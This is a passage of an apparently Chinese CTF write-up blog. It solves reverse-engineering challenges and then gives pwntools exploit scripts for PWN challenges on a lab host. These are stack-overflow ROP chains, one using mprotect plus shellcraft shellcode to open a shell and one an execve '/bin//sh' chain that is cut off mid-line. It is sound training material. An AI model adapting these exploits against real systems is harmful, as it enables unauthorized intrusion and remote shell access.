&quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行的结果是一样的:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807225943226.png" alt="image-20230807225943226"></p><p>然后复制到python的解密脚本中转换成utf-8的字符串就行,不过貌似没有base64的事…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = []</span><br><span class="line">data = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">str</span> += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\devtools\venu\Scripts\python.exe D:\Data\CTF\do\re_run.py </span><br><span class="line"><span class="number">110</span> <span class="number">49</span> <span class="number">98</span> <span class="number">111</span> <span class="number">111</span> <span class="number">107</span> <span class="number">123</span> <span class="number">117</span> <span class="number">115</span> <span class="number">49</span> <span class="number">110</span> <span class="number">71</span> <span class="number">95</span> <span class="number">102</span> <span class="number">51</span> <span class="number">97</span> <span class="number">116</span> <span class="number">117</span> <span class="number">114</span> <span class="number">51</span> <span class="number">115</span> <span class="number">95</span> <span class="number">55</span> <span class="number">111</span> <span class="number">95</span> <span class="number">100</span> <span class="number">101</span> <span class="number">55</span> <span class="number">101</span> <span class="number">114</span> <span class="number">109</span> <span class="number">49</span> <span class="number">110</span> <span class="number">51</span> <span class="number">95</span> <span class="number">52</span> <span class="number">108</span> <span class="number">103</span> <span class="number">48</span> <span class="number">114</span> <span class="number">105</span> <span class="number">55</span> <span class="number">104</span> <span class="number">109</span> <span class="number">125</span></span><br><span class="line">[<span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;98&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;107&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;116&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;108&#x27;</span>, <span class="string">&#x27;103&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;105&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;104&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;125&#x27;</span>]</span><br><span class="line">n1book&#123;us1nG_f3atur3s_7o_de7erm1n3_4lg0ri7hm&#125;</span><br></pre></td></tr></table></figure><p>结束…</p><h2 id="slices"><a href="#slices" class="headerlink" title="slices"></a>slices</h2><p>这题简单…因为没题干把题目的源代码也放上来吧…</p><p>题目代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter flag: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fail</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">32</span>: fail()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[:<span class="number">5</span>] != <span class="string">&#x27;hope&#123;&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">1</span>] != <span class="string">&#x27;&#125;&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">5</span>::<span class="number">3</span>] != <span class="string">&#x27;i0_tnl3a0&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">4</span>::<span class="number">4</span>] != <span class="string">&#x27;&#123;0p0lsl&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">3</span>::<span class="number">5</span>] != <span class="string">&#x27;e0y_3l&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">6</span>::<span class="number">3</span>] != <span class="string">&#x27;_vph_is_t&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">7</span>::<span class="number">3</span>] != <span class="string">&#x27;ley0sc_l&#125;&#x27;</span>: fail() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Congrats!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag is: &#x27;</span>, flag)</span><br></pre></td></tr></table></figure><p>就这么简单,写个脚本就行了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">source, start, end, step</span>):</span><br><span class="line">    idx = start</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(source)):</span><br><span class="line">        flag[idx] = source[i]</span><br><span class="line">        idx += step</span><br><span class="line">        <span class="keyword">if</span> idx &gt;= end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">go(<span class="string">&#x27;hope&#123;&#x27;</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">go(<span class="string">&#x27;i0_tnl3a0&#x27;</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;&#123;0p0lsl&#x27;</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">4</span>)</span><br><span class="line">go(<span class="string">&#x27;e0y_3l&#x27;</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>)</span><br><span class="line">go(<span class="string">&#x27;_vph_is_t&#x27;</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;ley0sc_l&#125;&#x27;</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br></pre></td></tr></table></figure><p>不出意外的话答案应该没啥问题…(解密脚本写的不咋地…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807233325281.png" alt="image-20230807233325281"></p><p>hope{i_l0ve_pyth0n_slic3s_a_l0t}</p><p>结束…</p><h2 id="super-anti-scalper-solution-9000"><a href="#super-anti-scalper-solution-9000" class="headerlink" title="super anti scalper solution 9000"></a>super anti scalper solution 9000</h2><p>这个题就是JS混淆,代码很简单,我们其实只需要一件事:</p><p>​JS中任何对象都是true….</p><p>还有一件事:</p><p>​!![]把[]转换为布尔值,又[]是一个对象,所以他是true,然后!取反,!再取反,所以!![]的值就是true</p><p>还有一件事:</p><p>​!![]+!![]对2个true进行相加,显然true是1,那么答案就是1+1</p><p>所以首先就把!![]全部换成1,方便查看:<del>其实不替换也行…</del></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808095802372.png" alt="image-20230808095802372"></p><p>很显然,输入的字符串就是n,然后在第27行进行了比较,所以其实直接把27行n&#x3D;&#x3D;&#x3D;后面那一串输出就行…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808100000896.png" alt="image-20230808100000896"></p><p>运行结果(记得按一下按钮):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808103948072.png" alt="image-20230808103948072" style="zoom:45%;" /><p>hope{sHoe_1ddbf55508afcc08_sold!}</p><p>结束…</p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>这题…给了代码…那就不是题了…</p><p>解释直接放注释了,运行出来的结果就是flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123; <span class="comment">//3个参数 51966 25 h4cky0u</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;<span class="comment">//51966</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;<span class="comment">//25</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808105306027.png" alt="image-20230808105306027"></p><p>结束…</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>我只能说这个题对于我有点新了…貌似有两个做法,但是第一个做法那个exit()不太会搞,先放了吧…</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>这个题,乍一看是一个ret2next,但是…一开始本地能跑通,远程不过…后续发现大概是缓冲区刷新的问题,于是让printf继续返回到exit()以进行缓冲区刷新即可通过</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809114710444.png" alt="image-20230809114710444"></p><p>开幕雷击(爽击)…gets()就躺在那里,所以我们肯定是要从main开始ret,不过注意一个问题,那就是没有push ebp了(具体去看main的汇编)</p><p>但是除此之外没有调用任何的函数,那就去找吧,去尝试找”flag”字符串发现第一个就是,然后双击过去到汇编(?),接下来按Ctrl+x快捷键跳转到使用了这个字符串的函数,发现是一个get_secret()函数:</p><p>有一个flag.txt文件相关的字符串:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115015923.png" alt="image-20230809115015923"></p><p>双击过去:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115051406.png" alt="image-20230809115051406"></p><p>ctrl+x跳转,然后f5查看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115244164.png" alt="image-20230809115244164"></p><p>这个函数将flag.txt写入了fl4g这个地方(可寻址),那么我们接下来的事就是想办法跳转到get_secret()然后再用printf或者write之类的输出就行:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line"><span class="comment">#payload += p32(printf_addr) + p32(1) + p32(flag_addr)</span></span><br><span class="line">payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地创建一个flag.txt测试一下没问题,然后把p32(1)改成p32(exit_addr),远程也能通过了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131447147.png" alt="image-20230809131447147"></p><p>或者这样用fflush也行,不过那个stdout的地址不是直接找到的那个,调试找出来的,先记录一下再说:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line">fflush_addr = <span class="number">0x0804F3A0</span></span><br><span class="line">stdout_addr = <span class="number">0x80EB200</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line">payload += p32(printf_addr) + p32(fflush_addr) + p32(flag_addr)</span><br><span class="line"><span class="comment"># payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(stdout_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个用fflush也行,就是stdout这个文件指针一下子没找到正确的那个</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这个应该是正解吧…或者可能是出题人疏忽了没搞三件套?(啥是三件套QWQ)</p><p>ret2shell的做法:</p><p>首先用checksec看看,发现有NX保护</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809132028022.png" alt="image-20230809132028022"></p><p>然后IDA中发现了mprotect():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131755622.png" alt="image-20230809131755622"></p><p>int mprotect(void *addr, size_t len, int prot)</p><p>三个参数分别是修改的起始地址，长度，修改为的权限</p><p>首先用这个函数去把.bss提权为可写权限(直接用7就行)</p><p>然后利用read进行shellcode的植入(read函数进行unix的读写)</p><p>接着就跳转到shellcode的位置进行getshell即可</p><p>注意:因为参数为3个,所以需要一个pop三连+ret的指令,这里用</p><p><code>ROPgadget --binary not_the_same_3dsctf_2016 --only &#39;pop|ret&#39; | grep pop</code></p><p>来获取,随便一个就行,例如:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809134557805.png" alt="image-20230809134557805" style="zoom:45%;" /><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line">mprotect_addr = <span class="number">0x0806ED40</span></span><br><span class="line"><span class="comment"># getflag_addr = 0x080489A0</span></span><br><span class="line"><span class="comment"># flag_addr = 0x080ECA2D</span></span><br><span class="line">pppr_addr = <span class="number">0x0806fcf0</span>  <span class="comment"># 使用ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop取得</span></span><br><span class="line">bss_addr = <span class="number">0x080EB000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">read_addr = <span class="number">0x0806E200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(mprotect_addr) + p32(pppr_addr) + p32(bss_addr) + p32(size) + p32(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># read --- 从stdin(0)即标准输入读取到bss_addr中</span></span><br><span class="line">payload += p32(read_addr) + p32(pppr_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(size)</span><br><span class="line"><span class="comment"># run shellcode</span></span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一直进行到read准备getshell</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode的读取(asm函数百度来的...)</span></span><br><span class="line">payload1=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参见:</p><p><a href="https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22129540833%22,%22source%22:%22Kata_Jhin%22%7D">https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22129540833%22%2C%22source%22%3A%22Kata_Jhin%22%7D</a></p><p>(不是一个题,但是做法差不多一样…)</p><p>结束…</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p>这道题是rop…ret2syscall…</p><p>ROPgadget是真的好用啊………</p><p>那么我正好看了某个文章:</p><p><a href="https://repw.github.io/2018/10/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8BROP%E5%9F%BA%E7%A1%80/#undefined">https://repw.github.io/2018/10/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8BROP%E5%9F%BA%E7%A1%80/#undefined</a></p><p>关于系统调用号:</p><p>​截图取自:<a href="https://blog.csdn.net/kaiandshan/article/details/44587225">https://blog.csdn.net/kaiandshan/article/details/44587225</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235944050.png" alt="image-20230812235944050" style="zoom: 50%;" /></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>代码非常简单,直接从一个overflow函数中gets()溢出,但是发现没有system()这些可利用的东西</p><p>所以是一个rop的题,那么既然是rop,就去用ROPgadget找rop</p><p>首先,最粗暴的方法就是直接用ROPgadget的一个奇葩功能直接生成shellcode,然后粘贴进脚本,加上偏移就行…</p><p><code>ROPgadget --binary rop --ropchain</code></p><p>使用该命令就会自动生成rop链,粘贴进脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># 记得要加上pack这个模块的引用,因为shellcode要用到</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27861</span>)</span><br><span class="line"><span class="comment"># 定义一个函数,将生成的shellcode直接粘贴进去,加上b&#x27;a&#x27; * (0xc + 4)的偏移即可</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shellcode</span>():</span><br><span class="line">    p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span> + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>)  <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span 